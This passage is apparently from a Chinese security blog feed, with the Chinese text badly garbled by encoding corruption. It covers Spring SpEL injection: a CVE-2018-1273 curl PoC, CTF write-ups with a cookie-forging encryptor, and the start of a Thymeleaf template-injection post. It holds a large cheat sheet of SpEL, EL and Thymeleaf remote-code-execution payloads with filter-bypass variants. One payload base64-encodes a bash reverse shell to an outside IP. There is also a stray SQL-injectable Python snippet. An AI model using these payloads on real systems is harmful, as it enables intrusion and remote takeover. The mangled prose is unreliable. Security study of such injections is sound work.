<p>åœ¨1.3.1ç‰ˆæœ¬ä¸­ä¸º<strong>PlaceholderResolver</strong>æ–°å¢äº†ä¸€ä¸ªå­ç±»<strong>NonRecursivePlaceholderResolver</strong>ï¼Œä¹‹å‰<code>PropertyPlaceholderHelper#parseStringValue</code>ä¸­<code>placeholderResolver.resolvePlaceholder</code>çš„è°ƒç”¨åœ¨æ–°ç‰ˆæœ¬ä¸­éƒ½å˜æˆäº†<strong>NonRecursivePlaceholderResolver</strong>çš„<code>resolvePlaceholder</code>æ–¹æ³•ã€‚</p>
<p>è€Œ<strong>PropertyPlaceholderHelper</strong>ä¹Ÿæ–°å¢äº†ä¸€ä¸ªå­ç±»<strong>NonRecursivePropertyPlaceholderHelper</strong>ï¼ŒåŸæ¥<code>PropertyPlaceholderHelper#parseStringValue</code>çš„è°ƒç”¨å…¨éƒ¨å˜æˆäº†<code>NonRecursivePropertyPlaceholderHelper#parseStringValue</code>ã€‚</p>
<p>åœ¨æœ€åˆè°ƒç”¨çš„æ—¶å€™ä¼šå°†<strong>placeholderResolver</strong>è½¬ä¸º<strong>NonRecursivePlaceholderResolver</strong>å¯¹è±¡<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713637054082-c364bbc2-3c3f-4f44-9f35-c6c57345ff27.png" alt="image.png" loading="lazy"></p>
<p><code>NonRecursivePlaceholderResolver#resolvePlaceholder</code>åœ¨è§£æçš„æ—¶å€™ä¼šå…ˆåˆ¤æ–­è‡ªèº«çš„resolverï¼Œå¦‚æœæ˜¯<strong>NonRecursivePlaceholderResolver</strong>åˆ™ä¸ä¼šè¿›è¡Œè§£æ<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713637299505-b73c410a-d55f-4440-aee2-00a7e70f9464.png" alt="image.png" loading="lazy"></p>
<p>æˆ‘ä»¬çŸ¥é“åœ¨åˆæ¬¡è°ƒç”¨<code>parseStringValue</code>çš„æ—¶å€™ä¼ å…¥çš„<strong>NonRecursivePlaceholderResolver</strong>å¯¹è±¡çš„<strong>resolver</strong>å±æ€§æ˜¯ä¸€ä¸ª<strong>PlaceholderResolver</strong>ã€‚ä¹Ÿå°±è¯´åœ¨<code>parseStringValue</code>çš„ç¬¬ä¸€å±‚è°ƒç”¨æ—¶ï¼ŒSpELè¡¨è¾¾å¼çš„è§£æè¿˜æ˜¯æ­£å¸¸çš„ï¼Œè€Œå†åƒä¹‹å‰ç‰ˆæœ¬é€’å½’è°ƒç”¨è§£ææ—¶ï¼Œä¼ å…¥çš„<strong>placeholderResolver</strong>å°±æ˜¯ä¸€ä¸ª<strong>NonRecursivePlaceholderResolver</strong>å¯¹è±¡ï¼Œä¹Ÿå°±ä¸èƒ½åœ¨è¿™ä¸€å±‚è¿›è¡Œä»»ä½•çš„SpELè¡¨è¾¾å¼çš„è§£æäº†ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713637613847-ee6099f0-10ca-4a1c-945e-e16ae4c79271.png" alt="image.png" loading="lazy"></p>
<h2 id="cve-2018-1273-rce-with-spring-data-commons">CVE-2018-1273: RCE with Spring Data Commons</h2>
<p>ä¸æ˜¯å¾ˆæ‡‚Spring Data Commonsçš„ä½¿ç”¨ï¼Œæ•…ä»…è®°å½•pocã€‚</p>
<p>æ¼æ´ç¯å¢ƒï¼š<a href="https://github.com/wearearima/poc-cve-2018-1273">https://github.com/wearearima/poc-cve-2018-1273</a></p>
<p>poc</p>
<pre><code>curl -X POST http://localhost:8080/account -d &quot;name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')]=123&quot;

curl -X POST http://localhost:8080/account -d &quot;name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')]=test&quot;
</code></pre>
<pre><code class="language-python">mu = re.match(r'.*\W', username)
if mu is None: 
    # éæ¿¾passwordä¸­æ‰€æœ‰è‹±æ–‡å­—æ¯è·Ÿç­‰è™Ÿ
    cflag = False
    for w in password: 
        if (w in string.ascii_letters) or (w == &quot;=&quot;): cflag = True
    if (cflag): 
        return None
    else:
        conn = sqlite3.connect(&quot;user.db&quot;)
        rows = conn.execute(f&quot;select * from user where (user='{username}') and (pass='{password}');&quot;)
</code></pre>
<h1 id="ç›¸å…³é¢˜ç›®">ç›¸å…³é¢˜ç›®</h1>
<h2 id="javacon">javacon</h2>
<p>é¢˜ç›®æ–‡ä»¶ï¼š<a href="https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar">https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar</a></p>
<p>é»˜è®¤è·¯ç”±ä¼šä½¿ç”¨è§£å¯†ç®—æ³•è§£å‡ºCookieä¸­çš„usernameï¼Œç„¶åä½¿ç”¨<code>getAdvanceValue</code>æ–¹æ³•è§£æusernameã€‚ç”±äºåŠ è§£å¯†ç®—æ³•çŸ¥é“ï¼Œæ‰€ä»¥å¯ä»¥æ§åˆ¶usernameçš„å†…å®¹å¯¼è‡´SpELæ³¨å…¥ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713684945667-37a33c73-9751-48bf-9ca3-0504bd35e853.png" alt="image.png" loading="lazy"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯<code>parseExpression</code>çš„ç¬¬äºŒä¸ªå‚æ•°<code>parserContext</code>ï¼Œå®ƒç”¨æ¥æä¾›ç‰¹å®šäºè§£æè¿‡ç¨‹çš„é…ç½®ã€‚å…·ä½“è€Œè¨€ï¼Œè¿™ä¸ªå‚æ•°å…è®¸ä½ è‡ªå®šä¹‰å¦‚ä½•å¤„ç†å’Œè§£æè¡¨è¾¾å¼ï¼ŒåŒ…æ‹¬å®šä¹‰è¡¨è¾¾å¼çš„å‰ç¼€å’Œåç¼€ï¼Œä»¥åŠæ˜¯å¦åº”è¯¥ä½¿ç”¨æ¨¡æ¿æ¨¡å¼ã€‚è¿™é‡Œå°±è‡ªå®šäº†è§£æå‰ç¼€<code>expressionPrefix</code>å’Œè§£æåç¼€<code>expressionSuffix</code><br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713685122146-f4e519bd-d0bd-46aa-acd0-ea8a541f3ca2.png" alt="image.png" loading="lazy"></p>
<p>å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç è¿›è¡Œæµ‹è¯•</p>
<pre><code class="language-java">package com.exploit;

import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Encryptor {
    static Logger logger = LoggerFactory.getLogger(Encryptor.class);

    public Encryptor() {
    }

    public static String encrypt(String key, String initVector, String value) {
        try {
            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;));
            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);
            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
            cipher.init(1, skeySpec, iv);
            byte[] encrypted = cipher.doFinal(value.getBytes());
            return Base64.getUrlEncoder().encodeToString(encrypted);
        } catch (Exception var7) {
            logger.warn(var7.getMessage());
            return null;
        }
    }

    public static String decrypt(String key, String initVector, String encrypted) {
        try {
            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;));
            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);
            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
            cipher.init(2, skeySpec, iv);
            byte[] original = cipher.doFinal(Base64.getUrlDecoder().decode(encrypted));
            return new String(original);
        } catch (Exception var7) {
            logger.warn(var7.getMessage());
            return null;
        }
    }

    public static void main(String[] args) {
        System.out.println(encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{2*2}&quot;));
    }
}
</code></pre>
<p>åœ¨modelä¸­çœ‹åˆ°è§£æåçš„å†…å®¹<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713685262376-216c2c1d-fa37-4493-909c-069adfc7a763.png" alt="image.png" loading="lazy"></p>
<p>payloadï¼Œæ€è·¯æ˜¯ç”¨åå°„çš„æ–¹å¼è·å–æ–¹æ³•è°ƒç”¨</p>
<pre><code>#{''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',''.getClass()).invoke(''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(null),'open -a Calculator')}
</code></pre>
<h2 id="2024çº¢æ˜è°·simp1escape">2024çº¢æ˜è°·ï½œSimp1escape</h2>
<p>AdminControllerå­˜åœ¨æ¨¡ç‰ˆæ³¨å…¥ï¼Œæ³¨å…¥ç‚¹æ˜¯hostname<br>
<img src="https://skyblu3519.github.io/post-images/SpEL/1713725578292-6ca35ca6-34cd-47ff-99be-cc4827676cc6.png" alt="image.png" loading="lazy"></p>
<p>è¿™é“é¢˜ç›®æ‰è®©æˆ‘æ„Ÿè§‰SpELæ³¨å…¥å’Œä¹‹å‰å­¦çš„Thymeleafæ¨¡æ¿æ³¨å…¥è¿˜ä¸å¤Ÿç»†è‡´ï¼Œä¹Ÿæ²¡æˆ‘æƒ³è±¡çš„é‚£ä¹ˆç®€å•ï¼Œæ•…åªæ•´ç†è¿™éƒ¨åˆ†çš„payloadï¼ˆæœªç»è¿‡urlç¼–ç ï¼‰</p>
<pre><code># é˜³å­çš„
[[T(com.sun.org.apache.xalan.internal.utils.ObjectFactory).newInstance(&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;,new java.lang.Boolean(true)).parseRaw('T(java.lang.Runtime).getRuntime().exec(&quot;bash -c {echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjEuMzEuMzIvMjIzMyAwPiYx}|{base64,-d}|{bash,-i}&quot;)').getValue()]]

# å‚è€ƒï¼šhttps://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE
[[${__${new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().callMethodN(new.org..apache.tomcat.util.IntrospectionUtils().getClass().findMethod(new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Runtime&quot;),&quot;getRuntime&quot;,null),&quot;invoke&quot;,{null,null},{new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.Object&quot;),new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;org.&quot;+&quot;thymeleaf.util.ClassLoaderUtils&quot;).loadClass(&quot;[Ljava.lang.Object;&quot;)}),&quot;exec&quot;,&quot;open -a Calculator&quot;,new.org..springframework.instrument.classloading.ShadowingClassLoader(new.org..apache.tomcat.util.IntrospectionUtils().getClass().getClassLoader()).loadClass(&quot;java.lang.String&quot;))}__::x}]]

# Thymeleafæ¨¡æ¿æ³¨å…¥ä¸­ä¸å¸¦&quot;_&quot;çš„å†™æ³•ï¼Œå‚è€ƒï¼šhttps://xz.aliyun.com/t/9826
[[${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;).getInputStream()).next()}
]]
</code></pre>
<p>ä¹‹åæœ‰ç©ºäº†å¥½å¥½åˆ†æä¸€ä¸‹è¿™é“é¢˜ç›®ã€‚</p>
<h1 id="æ‚é¡¹">æ‚é¡¹</h1>
<h2 id="æ•´ç†å·çš„payload">æ•´ç†ï¼ˆå·ï¼‰çš„payload</h2>
<pre><code>// PoCåŸå‹

// Runtime
T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
T(Runtime).getRuntime().exec(&quot;calc&quot;)

// ProcessBuilder
new java.lang.ProcessBuilder({'calc'}).start()
new ProcessBuilder({'calc'}).start()

******************************************************************************
// BypassæŠ€å·§

// åå°„è°ƒç”¨
T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)

// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ
#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)

// åå°„è°ƒç”¨+å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç»•è¿‡å¦‚javaconé¢˜ç›®ä¸­çš„æ­£åˆ™è¿‡æ»¤
T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})

// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ
#this.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})

// å½“æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤è¢«è¿‡æ»¤æˆ–è€…è¢«URLç¼–ç æ‰æ—¶ï¼Œå¯ä»¥é€šè¿‡Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦ï¼ŒPart1
// byteæ•°ç»„å†…å®¹çš„ç”Ÿæˆåé¢æœ‰è„šæœ¬
new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()

// å½“æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤è¢«è¿‡æ»¤æˆ–è€…è¢«URLç¼–ç æ‰æ—¶ï¼Œå¯ä»¥é€šè¿‡Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦ï¼ŒPart2
// byteæ•°ç»„å†…å®¹çš„ç”Ÿæˆåé¢æœ‰è„šæœ¬
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))

// JavaScriptå¼•æ“é€šç”¨PoC
T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)

T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;xxx&quot;),)

// JavaScriptå¼•æ“+åå°„è°ƒç”¨
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;})),)

// JavaScriptå¼•æ“+URLç¼–ç 
// å…¶ä¸­URLç¼–ç å†…å®¹ä¸ºï¼š
// ä¸åŠ æœ€åçš„getInputStream()ä¹Ÿè¡Œï¼Œå› ä¸ºå¼¹è®¡ç®—å™¨ä¸éœ€è¦å›æ˜¾
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(T(java.net.URLDecoder).decode(&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;)),)

// é»‘åå•è¿‡æ»¤&quot;.getClass(&quot;ï¼Œå¯åˆ©ç”¨æ•°ç»„çš„æ–¹å¼ç»•è¿‡ï¼Œè¿˜æœªæµ‹è¯•æˆåŠŸ
''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')

// JDK9æ–°å¢çš„shellï¼Œè¿˜æœªæµ‹è¯•
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()

// è½¬è‡ªï¼šhttps://www.jianshu.com/p/ce4ac733a4b9

${pageContext} å¯¹åº”äºJSPé¡µé¢ä¸­çš„pageContextå¯¹è±¡ï¼ˆæ³¨æ„ï¼šå–çš„æ˜¯pageContextå¯¹è±¡ã€‚ï¼‰

${pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)}   è·å–webè·¯å¾„

${header}  æ–‡ä»¶å¤´å‚æ•°

${applicationScope} è·å–webRoot

${pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;å‘½ä»¤&quot;).getInputStream())}  æ‰§è¡Œå‘½ä»¤


// æ¸—é€æ€è·¯ï¼šè·å–webrootè·¯å¾„ï¼Œexecæ‰§è¡Œå‘½ä»¤echoå†™å…¥ä¸€å¥è¯ã€‚

&lt;p th:text=&quot;${#this.getClass().forName('java.lang.System').getProperty('user.dir')}&quot;&gt;&lt;/p&gt;   //è·å–webè·¯å¾„
</code></pre>
<h2 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h2>
<p>è¿™äº›é“¾æ¥æ‰æ˜¯ç²¾åï¼ï¼ï¼<br>
å¾ˆå¥½çš„èƒŒæ™¯çŸ¥è¯†ï¼š<a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a><br>
<a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/">https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/</a><br>
<a href="https://github.com/wearearima/poc-cve-2018-1273">https://github.com/wearearima/poc-cve-2018-1273</a><br>
<a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a><br>
å¾ˆå¤špayloadï¼š<a href="https://xz.aliyun.com/t/9245">https://xz.aliyun.com/t/9245</a><br>
ä¸€é“å¾ˆæœ‰æ„æ€çš„é¢˜ç›®ï¼š<a href="https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/">https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</a><br>
Thymeleafæ¨¡æ¿æ³¨å…¥è¡¥å……ï¼š<a href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a><br>
å…³äºï¼š<br>
<a href="https://www.yulate.com/index.php/archives/48/">https://www.yulate.com/index.php/archives/48/</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Thymeleafæ¨¡æ¿æ³¨å…¥]]></title>
        <id>https://skyblu3519.github.io/post/thymeleaf-mo-ban-zhu-ru/</id>
        <link href="https://skyblu3519.github.io/post/thymeleaf-mo-ban-zhu-ru/">
        </link>
        <updated>2024-04-12T16:53:08.000Z</updated>
        <content type="html"><![CDATA[<p>å®éªŒç¯å¢ƒå‚è€ƒï¼š<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p>
<h1 id="èƒŒæ™¯çŸ¥è¯†">èƒŒæ™¯çŸ¥è¯†</h1>
<h2 id="ç‰‡æ®µè¡¨è¾¾å¼">ç‰‡æ®µè¡¨è¾¾å¼</h2>
<p>ç‰‡æ®µè¡¨è¾¾å¼è¯­æ³•ï¼š</p>
<ul>
<li><code>~{templatename::selector}</code>ï¼Œä¼šåœ¨/WEB-INF/templates/ç›®å½•ä¸‹å¯»æ‰¾åä¸ºtemplatenameçš„æ¨¡ç‰ˆä¸­å®šä¹‰çš„fragmentã€‚</li>
<li><code>~{templatename}</code>ï¼Œå¼•ç”¨æ•´ä¸ª<code>templatename</code>æ¨¡ç‰ˆæ–‡ä»¶ä½œä¸º<code>fragment</code></li>
<li><code>~{::selector} </code>æˆ– <code>~{this::selector}</code>ï¼Œå¼•ç”¨æ¥è‡ªåŒä¸€æ¨¡ç‰ˆæ–‡ä»¶åä¸º<code>selector</code>çš„<code>fragmnt</code></li>
</ul>
<p>å…¶ä¸­<code>selector</code>å¯ä»¥æ˜¯é€šè¿‡<code>th:fragment</code>å®šä¹‰çš„ç‰‡æ®µï¼Œä¹Ÿå¯ä»¥æ˜¯ç±»é€‰æ‹©å™¨ã€IDé€‰æ‹©å™¨ç­‰ã€‚<br>
å½“<code>~{}</code>ç‰‡æ®µè¡¨è¾¾å¼ä¸­å‡ºç°<code>::</code>ï¼Œåˆ™<code>::</code>åéœ€è¦æœ‰å€¼ï¼Œä¹Ÿå°±æ˜¯<code>selector</code>ã€‚</p>
<h2 id="é¢„å¤„ç†è¡¨è¾¾å¼">é¢„å¤„ç†è¡¨è¾¾å¼</h2>
<pre><code>__${expression}__
</code></pre>
<blockquote>
<p>é™¤äº†æ‰€æœ‰è¿™äº›ç”¨äºè¡¨è¾¾å¼å¤„ç†çš„åŠŸèƒ½å¤–ï¼ŒThymeleaf è¿˜å…·æœ‰é¢„å¤„ç†è¡¨è¾¾å¼çš„åŠŸèƒ½ã€‚<br>
é¢„å¤„ç†æ˜¯åœ¨æ­£å¸¸è¡¨è¾¾å¼ä¹‹å‰å®Œæˆçš„è¡¨è¾¾å¼çš„æ‰§è¡Œï¼Œå…è®¸ä¿®æ”¹æœ€ç»ˆå°†æ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚<br>
é¢„å¤„ç†çš„è¡¨è¾¾å¼ä¸æ™®é€šè¡¨è¾¾å¼å®Œå…¨ä¸€æ ·ï¼Œä½†è¢«åŒä¸‹åˆ’çº¿ç¬¦å·ï¼ˆå¦‚__${expression}__ï¼‰åŒ…å›´ã€‚</p>
</blockquote>
<h1 id="æµç¨‹æµ…æ">æµç¨‹æµ…æ</h1>
<p>å…ˆç®€å•çœ‹ä¸‹æ¸²æŸ“ä¸€ä¸ªæ¨¡æ¿çš„æµç¨‹ã€‚</p>
<p>å¯¹äºä¸‹é¢çš„ <code>controller</code>ï¼ˆæ³¨æ„ï¼šåœ¨ä½¿ç”¨<code>@Controller</code>å®šä¹‰æ—¶ï¼Œè¿”å›çš„<code>index</code>ä¸ä¼šè¢«å½“ä½œå­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ä¼šä½œä¸ºä¸€ä¸ªæ¨¡æ¿åç§°ï¼‰ï¼š</p>
<pre><code class="language-java">@GetMapping(&quot;/&quot;)
public String index(Model model) {
    model.addAttribute(&quot;name&quot;, &quot;World&quot;);
    return &quot;index&quot;;
}
</code></pre>
<p>é¦–å…ˆæ˜¯å¤„ç†è¯·æ±‚<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>çš„é€»è¾‘<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712932311102-6eef5ab3-cf2b-4bc3-a3f1-fd9be12f67dd.png" alt="image.png" loading="lazy"></p>
<p>å‰ä¸¤æ­¥æ˜¯æ ¹æ®è¯·æ±‚çš„URLã€HTTPæ–¹æ³•ç­‰ä¿¡æ¯æŸ¥æ‰¾ç›¸åº”çš„<strong>Handler</strong>å’Œ<strong>Handler Adapter</strong>ï¼Œå…·ä½“çš„å¤„ç†é€»è¾‘ä¹Ÿå°±æ˜¯æ‰§è¡Œæˆ‘ä»¬å†™çš„<code>controller</code>ä»£ç æ˜¯åœ¨</p>
<pre><code class="language-java">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());
</code></pre>
<p>è¿™é‡Œè¿”å›çš„<strong>ModelAndView</strong>å¯¹è±¡åŒ…å«äº†æ¨¡å‹æ•°æ®å’Œè§†å›¾åç§°<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712932938073-5769e749-dabf-471c-94d7-171fc60e63ae.png" alt="image.png" loading="lazy"></p>
<p><code>processDispatchResult</code>ä¼šæ ¹æ®<strong>ModelAndView</strong>å¯¹è±¡å¤„ç†è§†å›¾æ¸²æŸ“<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933145805-53ed2640-5b9a-4394-b27d-947a060b6590.png" alt="image.png" loading="lazy"></p>
<p><code>render</code>ä¸­<strong>DispatcherServlet</strong>ä¼šè°ƒç”¨è‡ªå·±çš„<code>resolveViewName</code>æ–¹æ³•æ ¹æ®è§†å›¾åç§°å’Œè¯·æ±‚ä¿¡æ¯é€‰å‡ºæœ€é€‚åˆçš„<strong>view</strong>å¯¹è±¡ï¼Œç„¶å<strong>view</strong>å¯¹è±¡è°ƒç”¨å®ƒçš„<code>render</code>æ–¹æ³•æ¸²æŸ“æ¨¡ç‰ˆå¤„ç†è¯·æ±‚ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933234854-0fca5626-e9ed-41ac-9b79-366fce0239de.png" alt="image.png" loading="lazy"></p>
<p><code>DispatcherServlet#resolveViewName</code>ä¼šä»éå†<code>viewResolvers</code>ä¸­å­˜å‚¨çš„<strong>ViewResolver</strong>å¯¹è±¡ï¼Œè°ƒç”¨å®ƒä»¬çš„<code>resolveViewName</code>æ–¹æ³•æ¥å¯»æ‰¾ã€‚<code>viewResolvers</code>å®åœ¨SpringBootåˆå§‹åŒ–çš„æ—¶å€™åŠ è½½çš„<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933612796-d978b9eb-e611-43fb-aa2f-4250ae7e0edf.png" alt="image.png" loading="lazy"></p>
<p>è¿™é‡Œç¬¬ä¸€ä¸ªè°ƒç”¨çš„æ˜¯<strong>ContentNegotiatingViewResolver</strong>ï¼Œå®ƒä¸æ˜¯ç›´æ¥è§£æè§†å›¾åç§°ï¼Œè€Œæ˜¯æ ¹æ®è¯·æ±‚çš„å†…å®¹ç±»å‹æˆ–è¯·æ±‚å‚æ•°å†³å®šä½¿ç”¨å“ªä¸ªå…¶ä»–è§†å›¾è§£æå™¨ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933664702-4d3b8765-8bf6-4ec0-9d55-8178b2d41d54.png" alt="image.png" loading="lazy"></p>
<p><code>ContentNegotiatingViewResolver#resolveViewName</code>é€‰å‡º<strong>View</strong>å¯¹è±¡å¯ä»¥åˆ†ä¸ºä¸¤æ­¥ï¼š</p>
<ul>
<li>è·å–å€™é€‰è§†å›¾ï¼š<code>getCandidateViews(viewName, locale, requestedMediaTypes)</code>æ–¹æ³•ä¼šåŸºäº<strong>è§†å›¾åç§°</strong>ã€<strong>åœ°åŒºè®¾ç½®</strong>å’Œ<strong>è¯·æ±‚çš„åª’ä½“ç±»å‹</strong>ï¼ˆAcceptè¯·æ±‚å¤´ï¼‰è·å–ä¸€ç³»åˆ—å€™é€‰è§†å›¾ã€‚</li>
<li>é€‰æ‹©æœ€ä½³è§†å›¾ï¼š<code>getBestView(candidateViews, requestedMediaTypes, attrs)</code>æ–¹æ³•ä»å€™é€‰è§†å›¾ä¸­é€‰æ‹©æœ€ä½³è§†å›¾ã€‚è¿™ä¸ªé€‰æ‹©æ˜¯åŸºäºæ‰€<strong>è¯·æ±‚çš„åª’ä½“ç±»å‹</strong>ï¼Œä»¥åŠè§†å›¾æ˜¯å¦èƒ½å¤Ÿå¤„ç†è¿™äº›åª’ä½“ç±»å‹ã€‚</li>
</ul>
<p>åœ¨<code>getCandidateViews</code>æ–¹æ³•ä¸­å¯ä»¥å‘ç°ï¼Œå®ƒä¾ç„¶æ˜¯éå†è‡ªå·±çš„<code>viewResolvers</code>ä¸­çš„<strong>ViewResolver</strong>å¯¹è±¡ï¼Œç„¶åè°ƒç”¨å®ƒä»¬çš„<code>resolveViewName</code>æ–¹æ³•<br>
